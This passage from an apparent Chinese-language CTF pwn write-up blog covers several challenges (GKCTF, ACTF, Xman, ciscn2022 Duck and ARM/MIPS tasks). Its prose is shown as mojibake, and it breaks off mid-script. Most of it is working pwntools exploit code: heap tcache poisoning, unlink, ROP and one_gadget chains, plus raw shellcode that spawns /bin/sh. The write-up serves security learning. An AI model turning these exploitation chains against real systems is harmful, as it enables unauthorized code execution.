éå†ç¨‹åºå½“å‰åŠ è½½çš„åŠ¨æ€åº“ï¼Œä»è€Œè·å–åŸºåœ°å€ï¼Œå…¶ä¸­å°±åŒ…æ‹¬libcã€‚æŸ¥çœ‹å…¶åç§»0x3c4b10å¯çŸ¥ä¸º\\_\\_malloc_hookï¼Œé‚£ä¹ˆåªè¦è§¦å‘\\_\\_malloc_hookçš„å€¼ä¸º\"monitor\"å³å¯æ‰§è¡Œåé—¨å‡½æ•°ã€‚\n\n![image-20221110212508037](https://files.catbox.moe/gccnwa.png)\n\né€šè¿‡off by null è¦†ç›–pä½ï¼Œæ„é€ å †å—é‡å ï¼Œé€šè¿‡echoæ³„éœ²libcåŸºå€ï¼Œä¿®æ”¹fdä¸ºmallochooké™„è¿‘ï¼Œä¿®æ”¹ä¸º\"monitor\"å³å¯\n\n```python\ndef cmd(*args):\n    payload = b''\n    for buf in args:\n        payload += buf\n        payload += b' '\n    sl(payload)\nio = start()\n\ncmd(b'a'*0x90,b'b'*0x60,b'c'*0xf0,b'd'*0x10)\n# å‰å—ä¸ºfastbinï¼Œpä½ä¸ç½®0ï¼Œå› æ­¤éœ€è¦è®¾ç½®presizeå’Œpä½\nfor i in range(7):\n    cmd(b'a'*(0x68-i))        # prev_size\n\ncmd(b'a'*0x60+b'\\x10\\x01')\ncmd(b'a'*0xf0)                # Unlinkåˆå¹¶å¤§å †å—\n\ncmd(b'a'*(0x100-1),b'b'*0x30,b'c'*0x30,b'd'*0x30,b'e'*0x30)\ncmd(b'a'*0x9f)\nfor i in range(7):\n    cmd(p8(0x71)*(0x9f-i))\n\ncmd(b\"echo\", b\"a\"*(0x5f),b\"b\"*(0x8f)) # leak\n\nmalloc_hook = l64()-88-0x10\n\ncmd(b\"a\"*0xa7)\ncmd(b\"a\"*0xa6) # å°†fdæŒ‡é’ˆçš„é«˜ä½ç½®é›¶\n\ncmd(b'a'*0xa0+p64(malloc_hook-0x23)[:-2])\n\nfor i in range(7):\n    cmd(b'q'*(0x9f-i)) # å¸ƒå±€é‡å å—\n\ns(hex(malloc_hook))\ncmd(b'monitor',b\"a\"*0x60,b\"b\"*0x13+b\"monitor\"+b\"a\"*0x45)\n# gdb.attach(io)\nia()\n```\n\n## 0x06 GKCTF demo_catRoom\n\nä¸€é“æ¨¡æ‹Ÿå®¢æˆ·ç«¯æœåŠ¡å™¨çš„é¢˜ç›®ï¼Œç®€å•çš„å †æº¢å‡ºï¼Œé—®é¢˜å‡ºåœ¨å¤åˆ¶è´¦å·å¯†ç æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€çš„å†…å®¹æœ€é•¿ä¸º0x68ï¼Œä½†æ˜¯æœåŠ¡å™¨ç«¯ä¼šå°†å…¶å¤åˆ¶åˆ°å¤§å°ä¸º0x48çš„ç¼“å†²åŒºã€‚åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¦†ç›–å­˜æ”¾adminå¯†ç çš„heapï¼Œç„¶åä¿®æ”¹å¯†ç æˆ–è€…æ›´æ”¹adminç”¨æˆ·åï¼Œç„¶åç™»å½•adminç”¨æˆ·ï¼Œæ‰“å°flagå³å¯ã€‚éš¾ç‚¹æ˜¯å®¡è®¡å’Œæœ‰è€å¿ƒå»å®¡serverç«¯ä»£ç ã€‚\n\n![image-20230225215539074](https://files.catbox.moe/78nr17.png)\n\nserverç«¯åœ¨åˆšå¼€å§‹çš„æ—¶å€™æ£€æµ‹ç¬¬ä¸€ä¸ªç”¨æˆ·æœ‰æ²¡æœ‰è¢«æ³¨å†Œï¼Œå¦‚æœæœªæ³¨å†Œï¼Œè‡ªåŠ¨æ³¨å†Œç”¨æˆ·admin\n\n![image-20230225215744113](https://files.catbox.moe/7f7aqg.png)\n\nå†…å­˜ç»“æ„å¦‚ä¸‹ï¼Œç”±äºå­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹tcachebiné“¾ï¼Œé“¾æ¥åˆ°adminçš„chunkä¸Šï¼Œä»è€Œä¿®æ”¹adminçš„å¯†ç ï¼›æˆ–è€…æœ€ç®€å•çš„æ˜¯ç›´æ¥ä¿®æ”¹è‡ªå·±çš„ç”¨æˆ·åä¸ºadmin\n\n![image-20230225215332153](https://files.catbox.moe/ojtryl.png)\n\nexpä½¿ç”¨ä¿®æ”¹å¯†ç çš„æ–¹æ³•ã€‚\n\n```python\ndef registe(name,passwd):\n    sla(\"0 exit \\n\",\"1\")\n    sla(\"your name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\ndef login(name,passwd):\n    sla(\"0 exit \\n\",\"2\")\n    sla(\"name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\ndef remove(name,passwd):\n    sla(\"0 exit \\n\",\"4\")\n    sla(\"remove name\\n\",name)\n    sla(\"passwd\\n\",passwd)\n\nregiste(\"1\",'1')\nregiste(\"2\",'2')\nregiste(\"3\",'3')\nremove(\"1\",'1')\nremove(\"3\",'3')\nremove(\"2\",'2')\nregiste(\"1\",'2'*5*8+\"\\x40\")\nregiste(\"2\",'2')\nregiste(\"ld1ng\",\"a\")\nlogin(\"admin\",\"ld1ng\")\n\nia()\n```\n\n![](https://files.catbox.moe/begpcf.png)\n\n## 0x07 GKCTF checkin\n\nåªèƒ½æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å­˜åœ¨é‡ç”Ÿçš„åŒleave retï¼Œå¯ä»¥æ ˆè¿ç§»ã€‚\n\nå…ˆæ³„éœ²å‡ºputsçš„åœ°å€ï¼Œç„¶åç¬¬äºŒæ¬¡æ ˆæº¢å‡ºè¿”å›one_gadgetã€‚\n\n```python\npop_rdi = 0x0000000000401ab3\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nsa(\">\",b'admin\\x00\\x00\\x00' + p64(pop_rdi) + p64(puts_got) + p64(0x00000000004018B5))\n# gdb.attach(io)\nsa('>',b'admin\\x00\\x00\\x00'+b'a'*0x18+p64(0x0000000000602400))\nlibc_base = l64() - 0x80970\ninf(libc_base)\n\nbinsh = libc_base + next(libc.search(b'/bin/sh\\x00'))\nsystem = libc_base+libc.sym['system']\ninf(system)\nog = [0x4f2a5,0x4f302,0x10a2fc]\nogg = libc_base + og[1]\nsa('>',b'admin\\x00\\x00\\x00'*3 + p64(ogg))\nsa('>',b'admin\\x00\\x00\\x00'*4 + p64(0x0000000000602400))\n\nia()\n```\n\n## 0x08 ACTF parity\n\né¢˜ç›®è¦æ±‚å¦‚ä¸‹ï¼Œç”¨æˆ·è¾“å…¥ä¸€æ®µshellcodeï¼Œä½†æ·»åŠ äº†å¥‡å¶æ ¡éªŒï¼Œshellcodeå¿…é¡»ç¬¦åˆå¥‡æ•°å¶æ•°äº¤æ›¿çš„æ¡ä»¶ã€‚\n\n```c\nbuf = mmap(0LL, 0x2000uLL, 7, 34, 0, 0LL);\n  v4 = read(0, buf, 0x2000uLL);\n  for ( i = 0; i < v4; ++i )\n  {\n    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )\n    {\n      puts(\"bad shellcode!\");\n      return 1;\n    }\n  }\n  ((void (__fastcall *)(_QWORD))buf)(0LL);\n```\n\nå…¶ä¸­ç³»ç»Ÿè°ƒç”¨syscallä¸º0f 05 æ˜¾ç„¶ä¸ç¬¦åˆå¥‡å¶äº¤æ›¿çš„ç‰¹ç‚¹ã€‚\n\nå¦ä¸€æ¡è·¯æ˜¯å†æ¬¡æ‰§è¡Œread@pltï¼ˆ0x4010f4ï¼‰ï¼Œé‡æ–°å¯¹ `buf` è¿›è¡Œè¾“å…¥ï¼Œå› ä¸º `rip` æ¥ç€ `read` çš„è§¦å‘ç»§ç»­æ‰§è¡Œï¼Œé‚£ä¹ˆè¾“å…¥ä¸åˆ¶é€  `shellcode` ç­‰é•¿çš„åƒåœ¾å­—ç¬¦ï¼Œç»§ç»­è¾“å…¥ `pwntools` è‡ªå¸¦çš„shellcodeå³å¯ã€‚\n\n```python\ncheck=lambda code:list(map(lambda s:s&1, code))\nshellcode = asm('''\n// 0 1 0 1\nxor rax,3\n// 0 1 0\ninc rax\n// 1\ncdq\n// 0 1 0 1\nshl rax,7\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0\ninc rax\n// 1\ncdq\n// 0 1 0 1\nshl rax,7\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0 1\nxor rax,0xf\n// 0 1 0 1\nshl rax,3\n// 0 1 0\nshl rax,1\n// 1\ncdq\n// 0 1 0 1\nxor rax,3\n// 0 1 0 \ninc rax\n// 1\ncdq\n// 0 1 0 1\nxor rdx,0x71\n// 0\nnop\n// 1 0 \ncall rax\n''')\nprint(check(shellcode))\n# print(hexdump(shellcode))\nprint(len(shellcode))\nsd(shellcode)\n# sleep(5)\ngdb.attach(io,'b *0x000004012F5')\npayload = fit({len(shellcode): asm(shellcraft.sh())})\nprint(hexdump(payload))\nsd(payload)\nia()\n```\n\nreadçš„æ•ˆæœ\n\n![image-20230226165151367](https://files.catbox.moe/jvum13.png)\n\n## 0x09 ACTF dreams\n\næ¼æ´è¿˜æ˜¯å¾ˆå¥½æ‰¾çš„ï¼Œåœ¨freeçš„æ—¶å€™æ²¡æœ‰å°†æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨UAFï¼Œå¯ä»¥editå’Œshowã€‚\n\n```c\nunsigned __int64 sell()\n{\n  int idx; // [rsp+4h] [rbp-Ch] BYREF\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  puts(\"You've come to sell your dreams.\");\n  printf(\"Which one are you trading in? \");\n  idx = 0;\n  __isoc99_scanf(\"%d\", &idx);\n  getchar();\n  if ( idx >= MAX_DREAMS || idx < 0 )\n  {\n    puts(\"Out of bounds!\");\n    exit(1);\n  }\n  puts(\"You let it go. Suddenly you feel less burdened... less restrained... freed. At last.\");\n  free(*(void **)(8LL * idx + dreams));\n  puts(\"Your money? Pfft. Get out of here.\");\n  return __readfsqword(0x28u) ^ v2;\n```\n\nåˆ©ç”¨æ–¹æ³•å°±æ˜¯å¤šæ¬¡ä¿®æ”¹tcacheé“¾ï¼Œé¦–å…ˆç”±äºåªèƒ½add5æ¬¡ï¼Œæ‰€ä»¥å…ˆä¿®æ”¹åˆ°MAX_DREAMSå˜é‡å¤„ï¼Œå°†å®ƒä¿®æ”¹ä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œä¹‹åå°†tcacheæ”¹ä¸ºfreeå‡½æ•°çš„åœ°å€ï¼Œç”³è¯·å‡ºæ¥åå°±å¯ä»¥showå‡ºæ¥ï¼Œæ³„éœ²å‡ºlibcåŸºå€ï¼›ä¹‹åå†æ¬¡ä¿®æ”¹ä¸ºfreehookåœ°å€ï¼Œå°†freehookæ”¹ä¸ºoggå³å¯ã€‚\n\nå¥½ä¹…æ²¡å†™è¿™ä¹ˆä¸‘çš„expäº†\n\n```python\ndef add(idx,date,con=\"bbbb\"):\n    sla(\"3. Visit a psychiatrist\",\"1\")\n    sla(\"loses its grip.\",str(idx))\n    # sl(date)\n    # sl(con)\n    sla(\"(mm/dd/yy))?\",date)\n    sla(\"you dream about?\",con)\n\ndef delete(idx):\n    sla(\"3. Visit a psychiatrist\",\"2\")\n    sla(\"sell your dreams.\",str(idx))\n\ndef show_edit(idx,con):\n    sla(\"3. Visit a psychiatrist\",\"3\")\n    sla(\"decipher your dream.\",str(idx))\n    sla(\"I don't make the rules. Or do I?\",con)\n\nadd(1,'aaaa')\nadd(2,'bbbb')\ndelete(1)\ndelete(2)\nshow_edit(2,p64(0x0000000000404008))\ndelete(1)\n\nadd(3,'cccc')\nadd(0,'dddd')\nadd(4,'aaaa',p64(0x9999))\n\n# sl(\"3\")\n# sla(\"your dream.\",str(0))\n# sla(\"I don't make the rules. Or do I?\",p64(0x0000403F88))\nshow_edit(0,p64(0x0000403F88))\nsla(\"3. Visit a psychiatrist\",\"3\")\nsla(\"decipher your dream.\",str(526))\nlibc_base = l64() - 0x80970\ninfo(hex(libc_base))\n\nog = [0x4f2a5,0x4f302,0x10a2fc]\nogg = libc_base + og[1]\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\ninfo(hex(free_hook))\nio.recv()\nsl(\"1\")\n# sl('zzzz')\n# sl('zzzz')\n# sl('zzzz')\n\n# sla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"7\")\nsl(\"7\")\nsl(\"7\")\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"8\")\nsl(\"8\")\nsl(\"8\")\n# add(7,'7')\n# add(8,'8')\ndelete(7)\ndelete(8)\n\nshow_edit(8,p64(free_hook))\n\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"9\")\nsl(\"9\")\nsl(\"9\")\n\nsla(\"3. Visit a psychiatrist\",\"1\")\nsl(\"10\")\nsl(p64(ogg))\n# sl(\"10\")\n\ndelete(9)\n# gdb.attach(io)   \nia()\n```\n\n## 0x0A [Xman]level6_x64\n\nfreeæ—¶æ²¡æœ‰æ£€æŸ¥æ ‡å¿—ä½ï¼Œå¹¶ä¸”æ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œæ‰€ä»¥å¯ä»¥åœ¨å·²ç»freeçš„çŠ¶æ€ä¸‹å†æ¬¡free\n\neditæ—¶å¯ä»¥è‡ªå®šä¹‰ä»»æ„å¤§å°å †å—ï¼Œæ‰€ä»¥é€ æˆæº¢å‡º\n\næµç¨‹ï¼š\n\n1. editæº¢å‡ºæ³„éœ²å †åœ°å€ï¼Œè¿›è€Œå¾—åˆ°å…¨å±€heap_liståœ°å€\n2. unlinkï¼Œè¿›è€Œå¯ä»¥æ§åˆ¶ä¿®æ”¹heap_list\n3. å°†heap_listä¸­çš„å †æŒ‡é’ˆæ”¹ä¸ºatoiçš„gotè¡¨ï¼Œshowå‡ºæ¥æ³„éœ²libcåœ°å€\n4. ä¿®æ”¹gotè¡¨ä¸ºog(æˆ–ä¿®æ”¹systemï¼Œaddæ—¶idxä¸º'/bin/sh')\n\n```python\nio = start()\n\ndef add(con):\n    sla(\"choice:\",\"2\")\n    sla(\"new note:\",str(len(con)))\n    sa(\"Enter your note:\",con)\n\ndef edit(idx,con):\n    sla(\"choice:\",\"3\")\n    sla(\"Note number:\",str(idx))\n    sla(\"Length of note:\",str(len(con)))\n    sa(\"Enter your note:\",con)\n\ndef show():\n    sla(\"choice\",\"1\")\n\ndef delete(idx):\n    sla(\"choice\",\"4\")\n    sla(\"Note number:\",str(idx))\n# leak heap base\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\nadd(\"a\"*0x80)\ndelete(3)\ndelete(1)\nedit(0,'b'*0x90)\nshow()\nru('b'*0x90)\nheap_base = uu64(rl().strip(b'\\n')) -0x19c0 +0x20\ninf(heap_base)\n#unlink\npayload = p64(0) + p64(0x80) + p64(heap_base -3*8) + p64(heap_base-2*8)\npayload = payload.ljust(0x80,b'a')\npayload += p64(0x80) +p64(0x90)\npayload = payload.ljust(0x100,b'b')\nedit(0,payload)\ndelete(1)\n#leak libc base\npayload2 = p64(2) + p64(1) +p64(0x100)+ p64(heap_base) + p64(1)+p64(8)+p64(elf.got['atoi'])\npayload2 = payload2.ljust(0x100,b'c')\nedit(0,payload2)\nshow()\nlibc_base = l64() - 0x39ea0\ninf(libc_base)\n# modify atoi_got to og\nog = one_gadget(libc_base)[3]\nedit(1,p64(og))\n\nsla(\"choice:\",\"2\")\n# gdb.attach(io)\n\nia()\n```\n\n## 0x0B Item Board\n\nfreeæ—¶æ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨UAFï¼Œå¯ä»¥ä»unsortedbinä¸­showå‡ºlibcåœ°å€\n\nç„¶åå°±æ˜¯ç±»ä¼¼å †é£æ°´ï¼Œfastbinå…ˆè¿›åå‡ºï¼Œdel 1ï¼›del 2ï¼›å†æ¬¡addæ—¶ï¼Œå®šä¹‰descriptionçš„å¤§å°ä¸º1çš„itemå¤§å°ï¼Œä¾¿èƒ½æ§åˆ¶åˆ°1 itemçš„ç»“æ„ä½“ï¼Œä¿®æ”¹å‡½æ•°æŒ‡é’ˆä¸ºsystemå³å¯\n\næ–¹æ³•äºŒæ˜¯æ²¡æœ‰å¯¹å¤§å°è¿›è¡Œé™åˆ¶ï¼Œè¶…è¿‡bufçš„å¤§å°é€ æˆæ ˆæº¢å‡ºï¼Œæ³¨æ„rbp-8çš„ä½ç½®éœ€è¦æ„é€ å‡çš„ç»“æ„ä½“æŒ‡é’ˆã€‚\n\n![image-20230420170949407](https://files.catbox.moe/8il68l.png)\n\n```PYTHON\nio = start()\ndef add(len,con):\n    sla(\"choose:\",\"1\")\n    sla(\"Item name?\",'z')\n    sla(\"Description's len?\",str(len))\n    sla(\"Description?\",con)\n\ndef listt():\n    sla(\"choice:\",\"2\")\n\ndef show(idx):\n    sla(\"choose:\",\"3\")\n    sla(\"Which item?\",str(idx))\n\ndef delete(idx):\n    sla(\"choose:\",\"4\")\n    sla(\"Which item?\",str(idx))\n\nadd(128,'a'*128)\nadd(128,'a'*128)\nadd(128,'a'*128)\ndelete(0)\nshow(0)\nlibc_base = l64() - 0x3c27b8\ninf(libc_base)\n# og = one_gadget(libc_base)[0]\nsystem = libc_base + libc.sym['system']\n\ndelete(1)\nadd(24,b'/bin/sh;'.ljust(0x10,b' ')+p64(system))\ndelete(0)\n\n# =================================================\n# pop_rdi = libc_base + 0x0000000000022b9a\n# strbin = libc_base + libc.search(b'/bin/sh\\x00').__next__()\n# payload = b'a'*1032 + p64(libc_base + 0x3c27b0) + b'a'*8 + p64(pop_rdi) + p64(strbin) + p64(system)\n# add(len(payload),payload)\n# gdb.attach(io)\nia()\n```\n\n## 0x0C typo\n\narm32æ¶æ„ï¼Œè¡¥å……ä¸€äº›armåŸºç¡€çŸ¥è¯†\n\n```tex\nR0åœ¨å¸¸è§„æ“ä½œä¸­å¯ç”¨äºå­˜å‚¨ä¸´æ—¶å€¼ï¼Œä¹Ÿå¯ä»¥ç”¨äºå­˜å‚¨å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æˆ–è¿”å›ç»“æœ\nåœ¨ARMæ¶æ„ä¸­çº¦å®šæŒ‡å®šå‡½æ•°å‰å››ä¸ªå‚æ•°å­˜å‚¨åœ¨R0~R3å¯„å­˜å™¨ä¸­\nR7å¯„å­˜å™¨åœ¨å‡½æ•°è°ƒç”¨ä¸­è´Ÿè´£å­˜å‚¨ç³»ç»Ÿè°ƒç”¨å·\nR11å¯„å­˜å™¨å³å¯ä»¥ç”¨æ¥è®°å½•å›æº¯ä¿¡æ¯,ä¹Ÿå¯ä»¥å½“åšå±€éƒ¨å˜é‡æ¥ä½¿ç”¨\nR13å¯„å­˜å™¨SP(å †æ ˆæŒ‡é’ˆ)æŒ‡å‘å †æ ˆçš„é¡¶éƒ¨\nR14å¯„å­˜å™¨LR(é“¾æ¥å¯„å­˜å™¨)åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨æ—¶ï¼ŒLRå¯„å­˜å™¨å†…ä¿å­˜è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œç”¨äºè¢«è°ƒç”¨å‡½æ•°(å­å‡½æ•°)ç»“æŸå·¥ä½œåè¿”å›è°ƒç”¨å‡½æ•°(çˆ¶å‡½æ•°)\nR15å¯„å­˜å™¨PC(ç¨‹åºè®¡æ•°å™¨)ç±»ä¼¼äºX86æ¶æ„ä¸‹çš„EIPå¯„å­˜å™¨è´Ÿè´£ä¿å­˜ç›®æ ‡åœ°å€ï¼Œä¸x86ä¸åŒçš„ç‚¹åœ¨äºPCåœ¨ARMçŠ¶æ€ä¸‹å­˜å‚¨å½“å‰æŒ‡ä»¤+8çš„åœ°å€ã€‚\n\nå…¶ä¸­R0 ~ R3æ˜¯ç”¨æ¥ä¾æ¬¡ä¼ é€’å‚æ•°çš„ï¼Œç›¸å½“äºx64ä¸‹çš„rdi, rsi, rdxï¼ŒR0è¿˜è¢«ç”¨äºå­˜å‚¨å‡½æ•°çš„è¿”å›å€¼ï¼ŒR7å¸¸ç”¨æ¥å­˜æ”¾ç³»ç»Ÿè°ƒç”¨å·ï¼ŒR11æ˜¯æ ˆå¸§ï¼Œç›¸å½“äºebpï¼Œåœ¨armä¸­ä¹Ÿè¢«å«ä½œFPï¼ŒR13æ˜¯æ ˆé¡¶ï¼Œç›¸å½“äºespï¼Œåœ¨armä¸­ä¹Ÿè¢«å«ä½œSPï¼ŒR14(LP)æ˜¯ç”¨æ¥å­˜æ”¾å‡½æ•°çš„è¿”å›åœ°å€çš„ï¼ŒR15ç›¸å½“äºeipï¼Œåœ¨armä¸­è¢«å«ä½œPCï¼Œä½†æ˜¯åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼ŒPCå­˜å‚¨ç€å½“å‰æŒ‡ä»¤å¾€åä¸¤æ¡æŒ‡ä»¤çš„ä½ç½®ï¼Œåœ¨armæ¶æ„ä¸­å¹¶ä¸æ˜¯åƒx86_64é‚£æ ·ç”¨retè¿”å›ï¼Œè€Œæ˜¯ç›´æ¥pop {PC}ã€‚\n```\n\n![d5b0775f7b7168d5ad8fa89244799b09](https://files.catbox.moe/y1clyb.png)\n\n![f1499bbf6081792ce4201b558ce0a532](https://files.catbox.moe/78xpdh.png)\n\nè¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯»æ‰¾gadget pop{r0,r4,pc}ï¼Œæœ‰binshå’Œsystemï¼Œè¿›è¡Œropå³å¯ã€‚\n\n```python\npop_pc = 0x00020904\npayload = b'a'*112 + p32(pop_pc) + p32(0x0006C384) + p32(0) + p32(0x110B4)\nsl('')\nsl(payload)\n```\n\n## 0x0D Add\n\nå­¦ä¹ [MIPSæ¶æ„åŸºç¡€](https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/)ï¼Œ\n\n```c\nint main(void)\n\n{\n  int iVar1;\n  long lVar2;\n  long lVar3;\n  char *pcVar4;\n  uint uVar5;\n  char challenge [10];\n  char buf [64];\n  \n  setvbuf(stdout,(char *)0x0,2,0);\n  puts(\"[calc]\");\n  puts(\"Type \\'help\\' for  help.\");\n  srand(0x123456);\n  iVar1 = rand();\n  sprintf(challenge,\"%d\",iVar1);\n  uVar5 = 0x80;\n  pcVar4 = buf;\n  do {\n    if (uVar5 < 2) break;\nLAB_00400984:\n    iVar1 = _IO_getc(stdin);\n    if (iVar1 < 0) goto LAB_00400ad4;\nLAB_004009a4:\n    *pcVar4 = (char)iVar1;\n    uVar5 = uVar5 - 1;\n    pcVar4 = pcVar4 + 1;\n  } while (iVar1 != 10);\n  if (uVar5 == 0) goto LAB_004009c0;\n  do {\n    *pcVar4 = '\\0';\nLAB_004009c0:\n    pcVar4 = strchr(buf,10);\n    if (pcVar4 != (char *)0x0) {\n      *pcVar4 = '\\0';\n    }\n    iVar1 = strcmp(buf,\"help\");\n    if (iVar1 == 0) {\n      pcVar4 = \"Type \\'exit\\' to exit.\";\nLAB_00400b18:\n      puts(pcVar4);\n      puts(\"Input 2 numbers just like:\");\n      puts(\"1 2\");\n    }\n    else {\n      iVar1 = strcmp(buf,\"exit\");\n      if (iVar1 == 0) {\n        puts(\"Exiting...\");\n        return 0;\n      }\n      iVar1 = strcmp(buf,challenge);\n      if (iVar1 == 0) {\n        printf(\"Your input was %p\\n\",buf);\n        uVar5 = 0x80;\n        pcVar4 = buf;\n        goto LAB_00400984;\n      }\n      pcVar4 = strchr(buf,0x20);\n      if (pcVar4 == (char *)0x0) {\n        pcVar4 = \"Error!\";\n        goto LAB_00400b18;\n      }\n      lVar2 = strtol(buf,(char **)0x0,10);\n      lVar3 = strtol(pcVar4 + 1,(char **)0x0,10);\n      printf(\"%d + %d = %d\\n\",lVar2,lVar3,lVar3 + lVar2);\n      if (lVar3 + lVar2 == 0x133a05e) {\n        puts(\"Thanks,Bye~\");\n        return 0;\n      }\n    }\n    uVar5 = 0x80;\n    iVar1 = _IO_getc(stdin);\n    pcVar4 = buf;\n    if (-1 < iVar1) goto LAB_004009a4;\nLAB_00400ad4:\n    if (pcVar4 == buf) {\n      return 0;\n    }\n  } while( true );\n}\n```\n\nçŒœå¯¹éšæœºæ•°ç»™bufçš„æ ˆåœ°å€ï¼Œéšæœºç§å­æ˜¯ç”±srand(0x123456)ç”Ÿæˆçš„ï¼Œå³ä¸ºå›ºå®šå€¼ã€‚\n\nbufæ”¾çš„æ˜¯è¾“å…¥å†…å®¹ï¼Œè€Œç¨‹åºæ¥å—è¾“å…¥çš„æ—¶å€™æ˜¯é‡åˆ°\\næ‰åœæ­¢ï¼Œæ‰€ä»¥å­˜åœ¨è¾“å…¥è¿‡é•¿å¯¼è‡´æ ˆæº¢å‡ºçš„é—®é¢˜ï¼Œé€šè¿‡æº¢å‡ºè·³åˆ°shellcodeå³å¯\n\n```python\ndll = CDLL('/lib/x86_64-linux-gnu/libc.so.6')\ndll.srand(0x123456)\nkey = dll.rand()\n\nsla(\"help.\\n\", str(key))\nru(\"was 0x\")\nbuf = int(rl().strip(),16)\ninf(buf)\n\nshellcode =  b\"\"\nshellcode += b\"\\x66\\x06\\x06\\x24\\xff\\xff\\xd0\\x04\\xff\\xff\\x06\\x28\\xe0\"\nshellcode += b\"\\xff\\xbd\\x27\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xe8\\xff\"\nshellcode += b\"\\xa4\\xaf\\xec\\xff\\xa0\\xaf\\xe8\\xff\\xa5\\x27\\xab\\x0f\\x02\"\nshellcode += b\"\\x24\\x0c\\x01\\x01\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\"\n\n# print(disasm(shellcode))\npayload = b'0'*4 + shellcode.ljust(0x70 - 4, b'0') + p32(buf + 4)\nsl(payload)\nsl(\"exit\")\nia()\n```\n\n## 0x0E ciscn2022 Duck\n\nglibc2.34 æ²¡æœ‰hookå‡½æ•°ï¼Œtcacheå­˜åœ¨å¼‚æˆ–åŠ å¯†æœºåˆ¶ï¼Œ\n\né¢˜ç›®å­˜åœ¨UAFï¼Œå¯ä»¥å¯¹å·²ç»freeçš„chunkè¿›è¡Œshowå’Œeditï¼Œæ‰€ä»¥å…ˆæ³„éœ²å‡ºlibc_baseå’Œheap_baseï¼Œä¹‹åå°±å¯ä»¥ä¿®æ”¹tcacheçš„fdæ„é€ é“¾\n\nä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œç„¶åèƒ½å¤Ÿæ§åˆ¶æ ˆåœ°å€è¿›è¡ŒROP\n\n```python\nio = start()\ndef add():\n    sla(\"Choice:\",\"1\")\n\ndef edit(idx,size,con):\n    sla(\"Choice:\",\"4\")\n    sla(\"Idx\",str(idx))\n    sla(\"Size:\",str(size))\n    sa(\"Content:\",con)\n\ndef show(idx):\n    sla(\"Choice\",\"3\")\n    sla(\"Idx\",str(idx))\n\ndef delete(idx):\n    sla(\"Choice\",\"2\")\n    sla(\"Idx\",str(idx))\n\nfor i in range(9):\n    add()\nfor i in range(7):    \n    delete(i)\ndelete(7)\nshow(7)\n# gdb.attach(io,'b *$rebase(0x0004060)')\nlibc_base = l64() - 0x1f2cc0\ninf(libc_base)\nshow(0)\nheap_base = u64(ru(b\"\\nDone\")[-5:].ljust(8,b'\\x00')) << 12\ninf(heap_base)\nfor i in range(5):\n    add()\nenviron_addr=libc_base+libc.sym['environ']\nedit(1,0x10,p64((heap_base>>12) ^ environ_addr) + p64(0))\nadd()\nadd()\n\nshow(15)\nstack = l64() - 0x168\ninf(stack)\n\ndelete(9)\ndelete(10)\nedit(10,0x10,p64((heap_base>>12) ^ stack) + p64(0))\nadd()\nadd()\n\nsystem = libc_base + libc.sym[\"system\"]\nbinsh = libc_base + next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))\npayload = p64(0)*3 + p64(pop_rdi) + p64(binsh) + p64(system)\nedit(17,0x30,payload)\n# gdb.attach(io,'b *$rebase(0x01688)')\nia()\n```\n\nç¬¬äºŒç§æ˜¯åˆ©ç”¨putsæ—¶ä¼šè°ƒç”¨\\_IO\\_new\\_file\\_overflowåˆ·æ–°ç¼“å†²åŒºï¼Œæ‰€ä»¥åˆ©ç”¨uafç”³è¯·åˆ°\\_IO\\_file\\_jumpsè¿™é‡Œä¿®æ”¹\\_IO\\_new\\_file\\_overflowä¸ºone\\_gadgetå³å¯getshell\n\n![image-20230510213118897](https://files.catbox.moe/ylkp5e.png)\n\n```python\nfor i in range(9):\n    add()\nfor i in range(7):    \n    delete(i)\ndelete(7)\nshow(7)\n# gdb.attach(io,'b *$rebase(0x0004060)')\nlibc_base = l64() - 0x1f2cc0\ninf(libc_base)\nshow(0)\nheap_base = u64(ru(b\"\\nDone\")[-5:].ljust(8,b'\\x00')) << 12\ninf(heap_base)\nfor i in range(5):\n    add()\n\n_IO_file_jumps = libc_base + libc.sym['_IO_file_jumps']\ninf(_IO_file_jumps)\nedit(1,0x10,p64((heap_base>>12) ^ _IO_file_jumps) + p64(0))\nadd()\nadd()\nogg = [0xda861,0xda864,0xda867]\nog = libc_base + ogg[1]\ngdb.attach(io)\nedit(15,0x20,p64(0)*3 + p64(og))\n```\n\nå¦å¤–æœ‰ä¸ªé¢˜æ˜¯ç¦ç”¨äº†systemï¼Œé‚£ä¹ˆåœ¨æ ˆä¸Šæ„é€ orwè¯»å–flag\n\n```python\nopen_ = libc_base + libc.sym['open']\nread_ = libc_base + 